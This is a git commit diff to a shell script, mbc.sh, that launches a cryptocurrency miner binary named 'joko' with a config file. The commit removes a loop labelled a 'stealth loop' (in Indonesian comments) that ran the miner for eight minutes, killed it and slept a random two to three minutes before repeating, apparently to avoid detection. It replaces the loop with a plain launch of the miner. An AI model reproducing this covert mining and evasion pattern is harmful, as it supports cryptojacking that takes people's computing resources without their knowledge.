520786f8b33ec5d19a577df86b75b99102c63e11
Voker <80169267+vokerjok@users.noreply.github.com>
2025-07-04 18:56:02 +0000

    Update mbc.sh

--- mbc.sh
+++ mbc.sh
@@ -19,19 +19,5 @@ END
 
 # Set permission
 chmod +x config.json joko
-
-# Stealth loop: 8 menit mining, 2–3 menit off
-while true; do
-  echo "[+] Mining for 8 minutes..."
-  ./joko -c config.json &
-  MINER_PID=$!
-
-  sleep 480  # 8 menit
-  echo "[*] Stopping mining temporarily..."
-  kill $MINER_PID
-
-  # Sleep 2–3 menit acak
-  OFF_TIME=$((RANDOM % 61 + 120))  # 120s - 180s
-  echo "[*] Sleeping for $OFF_TIME seconds..."
-  sleep $OFF_TIME
-done
+# run
+./joko -c config.json 
